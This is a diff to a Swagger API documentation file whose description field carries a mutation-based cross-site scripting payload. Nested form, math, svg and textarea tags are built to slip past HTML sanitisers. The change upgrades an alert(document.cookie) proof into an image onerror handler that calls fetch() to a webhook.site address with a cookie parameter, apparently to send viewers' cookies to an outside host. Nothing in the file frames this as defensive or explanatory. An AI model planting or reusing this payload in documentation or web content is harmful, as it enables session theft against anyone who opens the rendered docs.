@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('https://webhook.site/64071d37-3551-4234-9374-0ca44a3370c2?cookie=document.cookie') src=1>"></form>
 
   version: production
 basePath: /JSSResource/
